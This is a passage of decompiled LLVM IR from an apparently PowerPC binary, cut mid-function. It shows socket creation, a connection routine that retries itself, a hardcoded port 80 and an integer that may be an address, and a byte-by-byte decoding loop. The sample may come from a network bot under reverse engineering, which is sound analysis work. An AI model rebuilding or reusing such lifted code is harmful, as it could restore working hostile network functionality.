  %v1_10006ed4 = phi i32 [ 0, %dec_label_pc_10006ed4.lr.ph ], [ %v1_10006ed449, %dec_label_pc_10006ed0.backedge ]
  %v2_10006ed4 = add i32 %v1_10006ed4, %v0_10006ed4.pre
  %v3_10006ed4 = inttoptr i32 %v2_10006ed4 to i8*
  %v4_10006ed4 = load i8, i8* %v3_10006ed4, align 1
  %v1_10006ed8 = add i32 %v1_10006ed4, 1
  store i32 %v1_10006ed8, i32* %r11.global-to-local, align 4
  %v1_10006edc = inttoptr i32 %storemerge19.in to i8*
  %v2_10006edc = load i8, i8* %v1_10006edc, align 1
  %v4_10006ee4 = icmp eq i8 %v2_10006edc, %v4_10006ed4
  br i1 %v4_10006ee4, label %dec_label_pc_10006f88, label %dec_label_pc_10006eec

dec_label_pc_10006eec:                            ; preds = %dec_label_pc_10006ed4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006ed0.backedge

dec_label_pc_10006ed0.backedge:                   ; preds = %dec_label_pc_10006f88, %dec_label_pc_10006eec
  %v1_10006ed449 = phi i32 [ 0, %dec_label_pc_10006eec ], [ %v1_10006ed8, %dec_label_pc_10006f88 ]
  %storemerge19 = add i32 %storemerge19.in, 1
  %v1_10006ed0 = add i32 %v0_10006ed0, -1
  %v2_10006ed0 = icmp eq i32 %v1_10006ed0, 0
  br i1 %v2_10006ed0, label %dec_label_pc_10006d8c.backedge, label %dec_label_pc_10006ed4

dec_label_pc_10006ef8:                            ; preds = %dec_label_pc_10006dc4
  %v4_10006dd0 = icmp eq i32 %v3_10006da4, %v1_10006dc8
  br i1 %v4_10006dd0, label %dec_label_pc_10006efc, label %dec_label_pc_10006de0

dec_label_pc_10006efc:                            ; preds = %dec_label_pc_10006ef8, %dec_label_pc_10006f64, %dec_label_pc_10006f70, %dec_label_pc_10006f7c, %dec_label_pc_10006f88
  store i32 ptrtoint ([3 x i8]* @global_var_10006f04.115 to i32), i32* @lr, align 4
  %v1_10006f00 = call i32 @function_1000a260(i32 12)
  store i32 ptrtoint ([3 x i8]* @global_var_10006f0c.116 to i32), i32* @lr, align 4
  %v1_10006f08 = call i32 @function_1000a260(i32 13)
  store i32 ptrtoint ([3 x i8]* @global_var_10006f14.117 to i32), i32* @lr, align 4
  %v1_10006f10 = call i32 @function_1000a260(i32 14)
  store i32 ptrtoint ([3 x i8]* @global_var_10006f1c.118 to i32), i32* @lr, align 4
  %v1_10006f18 = call i32 @function_1000a260(i32 15)
  store i32 268463908, i32* @lr, align 4
  %v1_10006f20 = call i32 @function_1000a260(i32 16)
  store i32 268463916, i32* @lr, align 4
  %v0_10006f28 = call i32 @function_1000b3f0()
  %v0_10006f2c = load i32, i32* %r30.global-to-local, align 4
  store i32 268463928, i32* @lr, align 4
  %v2_10006f34 = call i32 @function_1000b510(i32 %v0_10006f2c, i32 9)
  br label %dec_label_pc_10006f38

dec_label_pc_10006f38:                            ; preds = %dec_label_pc_10006cf8, %dec_label_pc_10006fa4, %dec_label_pc_10006efc
  store i32 64, i32* @r4, align 4
  store i32 %v2_10006aa0, i32* @r3, align 4
  store i32 268463940, i32* @lr, align 4
  %v0_10006f40 = call i32 @function_1000ac0c()
  store i32 %v2_10006aa4, i32* @r3, align 4
  store i32 64, i32* @r4, align 4
  %v0_10006f4c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10006f4c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006f54.119 to i32), i32* @lr, align 4
  %v0_10006f50 = call i32 @function_1000ac0c()
  store i32 268463964, i32* @lr, align 4
  %v1_10006f58 = call i32 @function_1000cce4(i32 1)
  %v0_10006f5c = load i32, i32* %r19.global-to-local, align 4
  store i32 %v0_10006f5c, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10006ad4.backedge

dec_label_pc_10006f64:                            ; preds = %dec_label_pc_10006e08
  %v4_10006e14 = icmp eq i32 %v3_10006de8, %v1_10006e0c
  br i1 %v4_10006e14, label %dec_label_pc_10006efc, label %dec_label_pc_10006e28

dec_label_pc_10006f70:                            ; preds = %dec_label_pc_10006e4c
  %v4_10006e58 = icmp eq i32 %v3_10006e2c, %v1_10006e50
  br i1 %v4_10006e58, label %dec_label_pc_10006efc, label %dec_label_pc_10006e6c

dec_label_pc_10006f7c:                            ; preds = %dec_label_pc_10006e90
  %v4_10006e9c = icmp eq i32 %v3_10006e70, %v1_10006e94
  br i1 %v4_10006e9c, label %dec_label_pc_10006efc, label %dec_label_pc_10006eb0

dec_label_pc_10006f88:                            ; preds = %dec_label_pc_10006ed4
  %v4_10006ee0 = icmp eq i32 %v3_10006eb4, %v1_10006ed8
  br i1 %v4_10006ee0, label %dec_label_pc_10006efc, label %dec_label_pc_10006ed0.backedge

dec_label_pc_10006f94:                            ; preds = %dec_label_pc_10006cd4
  %v0_10006f94 = load i32, i32* %r30.global-to-local, align 4
  store i32 268464032, i32* @lr, align 4
  %v2_10006f9c = call i32 @function_1000b510(i32 %v0_10006f94, i32 9)
  br label %dec_label_pc_10006cf0

dec_label_pc_10006fa4:                            ; preds = %dec_label_pc_10006d8c.backedge, %dec_label_pc_10006d14
  store i32 ptrtoint ([3 x i8]* @global_var_10006fac.120 to i32), i32* @lr, align 4
  %v1_10006fa8 = call i32 @function_1000a260(i32 12)
  store i32 ptrtoint ([3 x i8]* @global_var_10006fb4.121 to i32), i32* @lr, align 4
  %v1_10006fb0 = call i32 @function_1000a260(i32 13)
  store i32 ptrtoint ([3 x i8]* @global_var_10006fbc.122 to i32), i32* @lr, align 4
  %v1_10006fb8 = call i32 @function_1000a260(i32 14)
  store i32 ptrtoint ([3 x i8]* @global_var_10006fc4.123 to i32), i32* @lr, align 4
  %v1_10006fc0 = call i32 @function_1000a260(i32 15)
  store i32 268464076, i32* @lr, align 4
  %v1_10006fc8 = call i32 @function_1000a260(i32 16)
  store i32 268464084, i32* @lr, align 4
  %v0_10006fd0 = call i32 @function_1000b3f0()
  br label %dec_label_pc_10006f38

; uselistorder directives
  uselistorder i32 %v1_10006ed0, { 1, 0 }
  uselistorder i32 %v1_10006ed8, { 1, 0, 2 }
  uselistorder i32 %v1_10006ed4, { 1, 0 }
  uselistorder i32 %v3_10006d98, { 2, 1, 0 }
  uselistorder i32 %v1_10006eb0, { 1, 0 }
  uselistorder i32 %v1_10006e90, { 1, 0 }
  uselistorder i32 %v1_10006e6c, { 1, 0 }
  uselistorder i32 %v1_10006e4c, { 1, 0 }
  uselistorder i32 %v1_10006e28, { 1, 0 }
  uselistorder i32 %v1_10006e08, { 1, 0 }
  uselistorder i32 %v1_10006de4, { 1, 0 }
  uselistorder i32 %v1_10006dc4, { 1, 0 }
  uselistorder i1 %v3_10006d9c99, { 0, 3, 2, 1 }
  uselistorder i32 %v3_10006d9898, { 9, 0, 8, 4, 7, 2, 6, 1, 5, 3 }
  uselistorder i32 %v2_10006ad8, { 1, 0 }
  uselistorder i32 %v2_10006b30, { 1, 0 }
  uselistorder i32 %v1_10006aec, { 1, 0 }
  uselistorder i32 %v2_10006aa8, { 1, 0, 2 }
  uselistorder i32 %v2_10006a1c, { 1, 0, 2 }
  uselistorder i32 %v2_100069f8, { 1, 0, 2 }
  uselistorder i32 %v2_100069c8, { 1, 6, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11 }
  uselistorder i32 %v0_10006860, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-8436, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-8452, { 1, 0 }
  uselistorder i32* %stack_var_-8448, { 1, 0 }
  uselistorder i32* %stack_var_-8444, { 1, 0 }
  uselistorder i32* %stack_var_-8456, { 1, 0 }
  uselistorder i32* %stack_var_-8440, { 1, 0 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2, 4, 3, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 15, 16 }
  uselistorder i32 268463516, { 1, 0 }
  uselistorder i32 (i32*)* @function_1000ba4c, { 3, 2, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 268462812, { 1, 0 }
  uselistorder i32 (i32)* @function_1000b93c, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1000b670, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10006f38, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10006efc, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10006ed4, { 1, 0 }
  uselistorder label %dec_label_pc_10006e90, { 1, 0 }
  uselistorder label %dec_label_pc_10006e4c, { 1, 0 }
  uselistorder label %dec_label_pc_10006e08, { 1, 0 }
  uselistorder label %dec_label_pc_10006dc4, { 1, 0 }
  uselistorder label %dec_label_pc_10006da4, { 1, 0 }
  uselistorder label %dec_label_pc_10006cf8, { 1, 0 }
  uselistorder label %dec_label_pc_10006cf0, { 1, 0 }
  uselistorder label %dec_label_pc_10006ad4.backedge, { 3, 2, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_10006c64, { 1, 0 }
  uselistorder label %dec_label_pc_10006ae4, { 1, 0 }
  uselistorder label %dec_label_pc_10006ae4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10006a84, { 1, 0 }
  uselistorder label %dec_label_pc_100069a4, { 1, 0 }
  uselistorder label %dec_label_pc_10006960, { 1, 0 }
  uselistorder label %dec_label_pc_1000691c, { 1, 0 }
}

define i32 @function_10006fd8() local_unnamed_addr {
dec_label_pc_10006fd8:
  store i32 268464600, i32* @global_var_1001eaf8.124, align 4
  %v0_10006fe8 = load i32, i32* @r3, align 4
  ret i32 %v0_10006fe8
}

define i32 @function_10006fec() local_unnamed_addr {
dec_label_pc_10006fec:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  store i32 0, i32* @r27, align 4
  %v0_10007014 = load i32, i32* @r30, align 4
  store i32 268566528, i32* @r28, align 4
  %v0_1000701c = load i32, i32* @r31, align 4
  store i32 268566528, i32* @r31, align 4
  %v2_10007028 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10007028, i32* @r30, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 268464180, i32* @lr, align 4
  %v3_10007030 = call i32 @function_1000c1bc(i32 2, i32 1, i32 0)
  %v3_10007034 = icmp eq i32 %v3_10007030, -1
  store i32 %v3_10007030, i32* @global_var_1001eaf0.125, align 4
  br i1 %v3_10007034, label %dec_label_pc_100070e4, label %dec_label_pc_10007050

dec_label_pc_10007050:                            ; preds = %dec_label_pc_10006fec
  %v2_10007038 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268464212, i32* @lr, align 4
  %v5_10007050 = call i32 @function_1000c180(i32 %v3_10007030, i32 1, i32 2, i32 %v2_10007038, i32 4)
  %v3_10007054 = load i32, i32* @global_var_1001eaf0.125, align 4
  store i32 3, i32* @r4, align 4
  store i32 268464236, i32* @lr, align 4
  %v2_10007068 = call i32 @function_1000b2c0(i32 %v3_10007054)
  store i32 4, i32* @r4, align 4
  store i32 268464256, i32* @lr, align 4
  %v2_1000707c = call i32 @function_1000b2c0(i32 %v3_10007054)
  %v3_10007080 = load i8, i8* @global_var_1001e9b0.126, align 1
  %v3_10007088 = icmp eq i8 %v3_10007080, 0
  br i1 %v3_10007088, label %dec_label_pc_10007108, label %dec_label_pc_10007094

dec_label_pc_10007094:                            ; preds = %dec_label_pc_10007050
  store i32 2, i32* %stack_var_-52, align 4
  %v0_100070a8 = call i32 @function_1000bb0c()
  %v0_100070ac = load i32, i32* @r27, align 4
  %v2_100070ac = inttoptr i32 %v0_100070a8 to i32*
  store i32 %v0_100070ac, i32* %v2_100070ac, align 4
  store i32 %v0_100070a8, i32* @r29, align 4
  %v3_100070bc = load i32, i32* @global_var_1001eaf0.125, align 4
  store i32 268464324, i32* @lr, align 4
  %v3_100070c0 = call i32 @function_1000bf88(i32 %v3_100070bc, i32 %v2_10007028, i32 16)
  %v3_100070c8 = icmp eq i32 %v3_100070c0, -1
  br i1 %v3_100070c8, label %dec_label_pc_10007150, label %dec_label_pc_100070d4

dec_label_pc_100070d4:                            ; preds = %dec_label_pc_10007108, %dec_label_pc_10007094
  %v3_100070dc = load i32, i32* @global_var_1001eaf0.125, align 4
  store i32 268464356, i32* @lr, align 4
  %v2_100070e0 = call i32 @function_1000c060(i32 %v3_100070dc, i32 1)
  br label %dec_label_pc_100070e4

dec_label_pc_100070e4:                            ; preds = %dec_label_pc_10006fec, %dec_label_pc_100070d4
  %v0_10007104 = phi i32 [ -1, %dec_label_pc_10006fec ], [ %v2_100070e0, %dec_label_pc_100070d4 ]
  store i32 %v0_10007014, i32* @r30, align 4
  store i32 %v0_1000701c, i32* @r31, align 4
  ret i32 %v0_10007104

dec_label_pc_10007108:                            ; preds = %dec_label_pc_10007050
  store i32 2, i32* %stack_var_-52, align 4
  %v0_10007124 = call i32 @function_1000bb0c()
  %v0_10007128 = load i32, i32* @r27, align 4
  %v2_10007128 = inttoptr i32 %v0_10007124 to i32*
  store i32 %v0_10007128, i32* %v2_10007128, align 4
  store i32 %v0_10007124, i32* @r29, align 4
  %v3_10007138 = load i32, i32* @global_var_1001eaf0.125, align 4
  store i32 268464448, i32* @lr, align 4
  %v3_1000713c = call i32 @function_1000bf88(i32 %v3_10007138, i32 %v2_10007028, i32 16)
  %v3_10007144 = icmp eq i32 %v3_1000713c, -1
  br i1 %v3_10007144, label %dec_label_pc_10007150, label %dec_label_pc_100070d4

dec_label_pc_10007150:                            ; preds = %dec_label_pc_10007108, %dec_label_pc_10007094
  %v0_10007150 = load i32, i32* @r29, align 4
  %v1_10007150 = inttoptr i32 %v0_10007150 to i32*
  %v2_10007150 = load i32, i32* %v1_10007150, align 4
  %v3_10007154 = load i32, i32* @global_var_1001eaf0.125, align 4
  store i32 %v3_10007154, i32* @r3, align 4
  %v3_10007158 = icmp eq i32 %v2_10007150, 99
  br i1 %v3_10007158, label %dec_label_pc_100071c0, label %dec_label_pc_10007160

dec_label_pc_10007160:                            ; preds = %dec_label_pc_100071c0, %dec_label_pc_10007150, %dec_label_pc_100071cc
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000717c.127 to i32), i32* @lr, align 4
  %v0_10007178 = call i32 @function_1000bfbc()
  store i32 268464516, i32* @lr, align 4
  %v1_10007180 = call i32 @function_1000cce4(i32 5)
  store i32 ptrtoint ([3 x i8]* @global_var_1000718c.128 to i32), i32* @lr, align 4
  %v0_10007188 = call i32 @function_1000b3f0()
  store i32 268464536, i32* @lr, align 4
  %v1_10007194 = call i32 @function_1000621c(i32 48101)
  store i32 268464540, i32* @lr, align 4
  %v0_10007198 = call i32 @function_10006fec()
  store i32 %v0_10007014, i32* @r30, align 4
  store i32 %v0_1000701c, i32* @r31, align 4
  ret i32 %v0_10007198

dec_label_pc_100071c0:                            ; preds = %dec_label_pc_10007150
  %v3_100071c0 = load i8, i8* @global_var_1001e9b0.126, align 1
  %v3_100071c4 = icmp eq i8 %v3_100071c0, 0
  br i1 %v3_100071c4, label %dec_label_pc_10007160, label %dec_label_pc_100071cc

dec_label_pc_100071cc:                            ; preds = %dec_label_pc_100071c0
  %v0_100071d0 = load i32, i32* @r27, align 4
  %v1_100071d0 = trunc i32 %v0_100071d0 to i8
  store i8 %v1_100071d0, i8* @global_var_1001e9b0.126, align 1
  br label %dec_label_pc_10007160

; uselistorder directives
  uselistorder i32 %v2_10007028, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 (i32)* @function_1000621c, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_1000c060, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1000bf88, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_1001e9b0.126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007160, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100070e4, { 1, 0 }
}

define i32 @function_100071d8() local_unnamed_addr {
dec_label_pc_100071d8:
  %r28.global-to-local = alloca i32, align 4
  store i32 268464632, i32* @lr, align 4
  %v1_100071f4 = call i32 @function_1000a2ec(i32 3)
  %v3_10007200 = call i32 @function_1000a238(i32 3, i32* null)
  store i32 268464648, i32* @lr, align 4
  %v1_10007204 = call i32 @function_10008024(i32 %v3_10007200)
  store i32 %v1_10007204, i32* @r31, align 4
  store i32 268464660, i32* @lr, align 4
  %v1_10007210 = call i32 @function_1000a260(i32 3)
  %v0_10007214 = load i32, i32* @r31, align 4
  %v3_10007214 = icmp eq i32 %v0_10007214, 0
  br i1 %v3_10007214, label %dec_label_pc_10007278, label %dec_label_pc_1000721c

dec_label_pc_1000721c:                            ; preds = %dec_label_pc_100071d8
  %v1_1000721c = add i32 %v0_10007214, 4
  %v2_1000721c = inttoptr i32 %v1_1000721c to i32*
  %v3_1000721c = load i32, i32* %v2_1000721c, align 4
  store i32 %v3_1000721c, i32* %r28.global-to-local, align 4
  %v0_10007220 = call i32 @function_10007ca8()
  %v0_10007224 = load i32, i32* @r31, align 4
  %v1_10007224 = inttoptr i32 %v0_10007224 to i8*
  %v2_10007224 = load i8, i8* %v1_10007224, align 1
  %v3_10007224 = zext i8 %v2_10007224 to i32
  %v2_10007230 = urem i32 %v0_10007220, %v3_10007224
  %v1_10007244 = mul nuw nsw i32 %v2_10007230, 4
  %v1_10007248 = load i32, i32* %r28.global-to-local, align 4
  %v2_10007248 = add i32 %v1_10007248, %v1_10007244
  %v3_10007248 = inttoptr i32 %v2_10007248 to i32*
  %v4_10007248 = load i32, i32* %v3_10007248, align 4
  store i32 %v4_10007248, i32* @global_var_1001ec10.131, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007254.132 to i32), i32* @lr, align 4
  %v1_10007250 = call i32 @function_10007fe0(i32 %v0_10007224)
  store i32 ptrtoint ([3 x i8]* @global_var_1000725c.133 to i32), i32* @lr, align 4
  %v1_10007258 = call i32 @function_1000a2ec(i32 4)
  %v3_10007264 = call i32 @function_1000a238(i32 4, i32* null)
  %v4_10007264 = inttoptr i32 %v3_10007264 to i16*
  %v3_10007268 = load i16, i16* %v4_10007264, align 2
  store i16 %v3_10007268, i16* bitcast (i32* @global_var_1001ec0e.134 to i16*), align 4
  store i32 268464760, i32* @lr, align 4
  %v1_10007274 = call i32 @function_1000a260(i32 4)
  br label %dec_label_pc_10007278

dec_label_pc_10007278:                            ; preds = %dec_label_pc_100071d8, %dec_label_pc_1000721c
  %v0_10007290 = phi i32 [ %v1_10007210, %dec_label_pc_100071d8 ], [ %v1_10007274, %dec_label_pc_1000721c ]
  ret i32 %v0_10007290

; uselistorder directives
  uselistorder label %dec_label_pc_10007278, { 1, 0 }
}

define i32 @function_10007294(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10007294:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp35 = call i8 @__decompiler_undefined_function_2()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp40 = call i32 @__decompiler_undefined_function_0()
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1620 = alloca i32, align 4
  %stack_var_-1644 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1640 = alloca i32, align 4
  %stack_var_-1484 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-1652 = alloca i32, align 4
  %stack_var_-1554 = alloca i32, align 4
  %stack_var_-1586 = alloca i32, align 4
  %stack_var_-1604 = alloca i8*, align 4
  %stack_var_-1632 = alloca i8, align 1
  %stack_var_-1520 = alloca i32, align 4
  %stack_var_-1656 = alloca i16, align 2
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-1356 = alloca i32, align 4
  %v0_10007294 = load i32, i32* @lr, align 4
  store i32 %v0_10007294, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r30, align 4
  %v0_100072a8 = load i32, i32* @r29, align 4
  %v2_100072ac = ptrtoint i32* %stack_var_-1356 to i32
  store i32 %v2_100072ac, i32* %r29.global-to-local, align 4
  %v2_100072b0 = load i32, i32* %arg2, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 268464884, i32* @lr, align 4
  %v1_100072f0 = call i32 @function_1000b808(i32 %v2_100072b0)
  store i32 268464892, i32* @lr, align 4
  %v1_100072f8 = call i32 @function_1000c26c(i32 %v2_100072ac)
  store i32 %v2_100072ac, i32* @r3, align 4
  store i32 268464904, i32* @lr, align 4
  %v2_10007304 = call i32 @function_1000c220(i32 %v2_100072ac, i32 2)
  store i32 0, i32* @r5, align 4
  store i32 268464920, i32* @lr, align 4
  %v3_10007314 = call i32 @function_1000b748(i32 0, i32 %v2_100072ac, i32 0)
  store i32 268464932, i32* @lr, align 4
  %v2_10007320 = call i32 @function_1000c298(i32 17, i32 1)
  store i32 268464948, i32* @lr, align 4
  %v2_10007330 = call i32 @function_1000c298(i32 5, i32 268464088)
  store i32 268464968, i32* @lr, align 4
  %v3_10007344 = call i32 @function_1000b558(i32 ptrtoint ([14 x i8]* @global_var_1000deac.135 to i32), i32 2)
  %v3_10007348 = icmp eq i32 %v3_10007344, -1
  store i32 %v3_10007344, i32* @r29, align 4
  br i1 %v3_10007348, label %dec_label_pc_10007734, label %dec_label_pc_10007354

dec_label_pc_10007354:                            ; preds = %dec_label_pc_10007734, %dec_label_pc_10007294
  %v0_10007360 = phi i32 [ %v3_10007744, %dec_label_pc_10007734 ], [ %v3_10007344, %dec_label_pc_10007294 ]
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10007364 = ptrtoint i32* %stack_var_-1648 to i32
  store i32 %v2_10007364, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-1648, align 4
  store i32 268465012, i32* @lr, align 4
  %v3_10007370 = call i32 @function_1000b1d8(i32 %v0_10007360, i32 -2147199228, i32 %v2_10007364)
  store i32 268465020, i32* @lr, align 4
  %v0_10007378 = call i32 @function_1000b3f0()
  br label %dec_label_pc_1000737c

dec_label_pc_1000737c:                            ; preds = %dec_label_pc_10007734, %dec_label_pc_10007354
  store i32 268566528, i32* @r24, align 4
  store i32 268566528, i32* @r22, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007390.136 to i32), i32* @lr, align 4
  %v1_1000738c = call i32 @function_1000b3a8(i32 ptrtoint (i32* @global_var_1000de44.8 to i32))
  %v2_10007390 = ptrtoint i16* %stack_var_-1656 to i32
  store i32 %v2_10007390, i32* @r26, align 4
  store i32 268465048, i32* @lr, align 4
  %v1_10007394 = call i32 @function_1000ae68(i32 %v1_1000738c)
  store i32 791543808, i32* @r29, align 4
  store i32 29184, i32* @r28, align 4
  store i32 80, i32* %r0.global-to-local, align 4
  store i16 80, i16* bitcast (i32* @global_var_1001ec0e.134 to i16*), align 4
  store i32 1105119797, i32* @global_var_1001ec10.131, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  store i8* inttoptr (i32 791543808 to i8*), i8** %stack_var_-1604, align 4
  store i32 ptrtoint (i32* @global_var_1000dedc.142 to i32), i32* @r4, align 4
  store i32 36, i32* @r5, align 4
  store i32 %v1_10007394, i32* @global_var_1001eb10.71, align 4
  %v2_100073f4 = ptrtoint i32* %stack_var_-1520 to i32
  store i32 %v2_100073f4, i32* @r3, align 4
  store i16 2, i16* bitcast (i32* @global_var_1001ec0c.130 to i16*), align 4
  %v0_100073fc = load i32, i32* @r31, align 4
  %v1_100073fc = inttoptr i32 %v0_100073fc to i32*
  %v2_100073fc = load i32, i32* %v1_100073fc, align 4
  store i32 %v2_100073fc, i32* @r27, align 4
  store i32 268465156, i32* @lr, align 4
  %v0_10007400 = call i32 @function_1000bb50()
  %v3_10007408 = load i32, i32* %stack_var_-1520, align 4
  store i32 %tmp37, i32* %r9.global-to-local, align 4
  %v2_10007410 = add i32 %tmp37, %tmp36
  %v2_10007418 = add i32 %v2_10007410, %tmp38
  %v2_10007420 = add i32 %v2_10007418, %tmp39
  %v2_10007428 = add i32 %v2_10007420, %tmp40
  %v2_10007430 = add i32 %v2_10007428, %tmp41
  %v2_10007434 = add i32 %v2_10007430, %v3_10007408
  store i32 %v2_10007434, i32* %r0.global-to-local, align 4
  %v3_10007438 = icmp eq i32 %v2_10007434, 0
  br i1 %v3_10007438, label %dec_label_pc_100075f4, label %dec_label_pc_10007440

dec_label_pc_10007440:                            ; preds = %dec_label_pc_1000737c
  %v3_10007440 = load i8*, i8** %stack_var_-1604, align 4
  %v4_10007440 = ptrtoint i8* %v3_10007440 to i32
  store i32 %v4_10007440, i32* %r9.global-to-local, align 4
  %v0_10007444 = load i32, i32* @r27, align 4
  %v4_10007448 = zext i8 %tmp35 to i32
  store i32 %v4_10007448, i32* %r0.global-to-local, align 4
  store i32 %v2_10007390, i32* @r26, align 4
  %v2_10007454 = ptrtoint i8* %stack_var_-1632 to i32
  store i32 %v2_10007454, i32* @r28, align 4
  store i8 %tmp35, i8* %stack_var_-1632, align 1
  store i32 ptrtoint (i32* @global_var_10007460.143 to i32), i32* @lr, align 4
  %v1_1000745c = inttoptr i32 %v0_10007444 to i8*
  %v2_1000745c = call i32 @function_1000ab64(i8* %v1_1000745c)
  store i32 100, i32* %r9.global-to-local, align 4
  %v2_10007468 = srem i32 2, %v2_1000745c
  %v0_10007474 = load i32, i32* @r27, align 4
  store i32 %v2_10007468, i32* %r0.global-to-local, align 4
  %v2_1000747c = add i32 %v0_10007474, %v2_10007468
  %v3_1000747c = inttoptr i32 %v2_1000747c to i8*
  %v4_1000747c = load i8, i8* %v3_1000747c, align 1
  %v5_1000747c = zext i8 %v4_1000747c to i32
  store i32 %v5_1000747c, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000748c.144 to i32), i32* @lr, align 4
  %v1_10007488 = inttoptr i32 %v0_10007474 to i8*
  %v2_10007488 = call i32 @function_1000ab64(i8* %v1_10007488)
  %v0_1000749c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000749c = sub i32 -82, %v0_1000749c
  %v1_100074a0 = urem i32 %v1_1000749c, 256
  store i32 %v1_100074a0, i32* %r29.global-to-local, align 4
  %v2_10007494 = srem i32 4, %v2_10007488
  %v0_100074a8 = load i32, i32* @r27, align 4
  store i32 %v2_10007494, i32* %r0.global-to-local, align 4
  %v2_100074b0 = add i32 %v0_100074a8, %v2_10007494
  %v3_100074b0 = inttoptr i32 %v2_100074b0 to i8*
  %v4_100074b0 = load i8, i8* %v3_100074b0, align 1
  %v5_100074b0 = zext i8 %v4_100074b0 to i32
  %v1_100074b8 = sub nuw nsw i32 -1, %v5_100074b0
  store i32 %v1_100074b8, i32* %r9.global-to-local, align 4
  %v2_100074c0 = add nsw i32 %v1_100074a0, %v1_100074b8
  store i32 %v2_100074c0, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100074c8.145 to i32), i32* @lr, align 4
  %v1_100074c4 = inttoptr i32 %v0_100074a8 to i8*
  %v2_100074c4 = call i32 @function_1000ab64(i8* %v1_100074c4)
  %v0_100074d8 = load i32, i32* %r29.global-to-local, align 4
  %v1_100074d8 = urem i32 %v0_100074d8, 256
  store i32 %v1_100074d8, i32* %r29.global-to-local, align 4
  %v2_100074d0 = srem i32 6, %v2_100074c4
  %v0_100074e0 = load i32, i32* @r27, align 4
  store i32 %v2_100074d0, i32* %r0.global-to-local, align 4
  %v2_100074e8 = add i32 %v0_100074e0, %v2_100074d0
  %v3_100074e8 = inttoptr i32 %v2_100074e8 to i8*
  %v4_100074e8 = load i8, i8* %v3_100074e8, align 1
  %v5_100074e8 = zext i8 %v4_100074e8 to i32
  %v1_100074f0 = sub nuw nsw i32 -1, %v5_100074e8
  store i32 %v1_100074f0, i32* %r9.global-to-local, align 4
  %v2_100074f8 = add nsw i32 %v1_100074d8, %v1_100074f0
  store i32 %v2_100074f8, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007500.146 to i32), i32* @lr, align 4
  %v1_100074fc = inttoptr i32 %v0_100074e0 to i8*
  %v2_100074fc = call i32 @function_1000ab64(i8* %v1_100074fc)
  %v0_10007510 = load i32, i32* %r29.global-to-local, align 4
  %v1_10007510 = urem i32 %v0_10007510, 256
  store i32 %v1_10007510, i32* %r29.global-to-local, align 4
  %v2_10007508 = srem i32 8, %v2_100074fc
  %v0_10007518 = load i32, i32* @r27, align 4
  store i32 %v2_10007508, i32* %r0.global-to-local, align 4
  %v2_10007520 = add i32 %v0_10007518, %v2_10007508
  %v3_10007520 = inttoptr i32 %v2_10007520 to i8*
  %v4_10007520 = load i8, i8* %v3_10007520, align 1
  %v5_10007520 = zext i8 %v4_10007520 to i32
  %v1_10007528 = sub nuw nsw i32 -1, %v5_10007520
  store i32 %v1_10007528, i32* %r9.global-to-local, align 4
  %v2_10007530 = add nsw i32 %v1_10007510, %v1_10007528
  store i32 %v2_10007530, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007538.147 to i32), i32* @lr, align 4
  %v1_10007534 = inttoptr i32 %v0_10007518 to i8*
  %v2_10007534 = call i32 @function_1000ab64(i8* %v1_10007534)
